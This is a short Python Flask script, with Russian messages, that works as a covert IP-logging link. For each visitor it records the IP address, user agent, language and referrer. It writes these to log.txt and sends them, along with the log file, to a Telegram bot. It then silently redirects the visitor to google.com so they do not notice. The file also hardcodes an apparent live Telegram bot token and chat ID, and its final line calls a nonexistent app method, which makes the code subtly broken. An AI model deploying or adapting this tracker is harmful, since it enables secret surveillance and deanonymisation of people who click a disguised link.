import os
from datetime import datetime
from flask import Flask, make_response, redirect, request
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"


def send_telegram_message(text):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
  try:
    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Ошибка отправки текста: {e}")


def send_telegram_document(file_path, caption):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
  try:
    with open(file_path, "rb") as f:
      files = {"document": f}
      data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
      requests.post(url, data=data, files=files, timeout=10)
  except Exception as e:
    print(f"Ошибка отправки файла: {e}")


@app.route("/")
def track_user():
  visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
  ip = request.headers.get(
      "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
  )
  user_agent = request.headers.get("User-Agent", "Не определен")
  accept_lang = request.headers.get("Accept-Language", "Не определен")
  host = request.headers.get("Host", "Не определен")
  full_url = request.url
  referer = request.referrer or "Прямой переход"

  log_content = (
      f"=== НОВЫЙ ПЕРЕХОД ===\n"
      f"Время: {visit_time}\n"
      f"IP-адрес: {ip}\n"
      f"Запрошенный URL: {full_url}\n"
      f"Хост: {host}\n"
      f"Реферер: {referer}\n"
      f"Язык браузера: {accept_lang}\n"
      f"User-Agent: {user_agent}\n"
      f"======================\n\n"
  )

  file_name = "log.txt"
  with open(file_name, "a", encoding="utf-8") as f:
    f.write(log_content)

  message_text = (
      f"🔔 *Новый переход по ссылке!*\n\n"
      f"⏱ *Время:* `{visit_time}`\n"
      f"🌐 *IP:* `{ip}`\n"
      f"💻 *Устройство:* \n`{user_agent}`"
  )

  send_telegram_message(message_text)
  send_telegram_document(file_name, caption="📁 Полный лог данных (txt)")

  response = make_response(redirect("https://google.com"))
  return response


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5000))
  app.org(host="0.0.0.0", port=port)